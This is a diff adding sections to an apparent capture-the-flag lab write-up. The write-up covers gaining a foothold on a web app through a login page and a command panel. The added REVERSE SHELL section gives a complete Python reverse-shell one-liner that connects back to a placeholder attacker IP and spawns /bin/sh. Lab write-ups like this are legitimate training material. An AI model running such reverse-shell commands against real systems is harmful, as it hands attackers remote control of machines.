@@ -90,6 +90,8 @@ After letting the scan run for a few moments, we have some interesting results:
 
 We can see both a /login.php and  a /portal.php which are interesting.  Let's navigate to the login page.
 
+# FOOTHOLD
+
 ![](/images/login.png)
 
 We know the Username from our notes of the HTML comment on the home page, but we don't know the password.  A quick trial of usual passwords doesn't work.  We can try a sniper attack in BurpSuite, but what about the text in /robots.txt?  Let's try that.
@@ -119,4 +121,17 @@ Awesome, we have the first ingredient as well as a hint for how to find the rest
 Alternatively, we would have been able to 'less' the .txt files and gotten their contents in the browser:
 
 ![](/images/a_less_first.png)![](/images/less_clue.png)
+
+# REVERSE SHELL
+
+At this point, we can continue to issue commands to the web browser panel.  However, for practice and ease of use, I chose to implement a reverse shell.  I started netcat on my machine, and listened on port 4444 (an arbitrary port).  I then issued the command
+
+\`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\[YOUR IP]",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'\`
+
+
+on the control panel, and was able to spawn the reverse shell:
+
+![](/images/a_shell_open.png)
+
+Now we can explore the machine and look for our next ingredient:
 
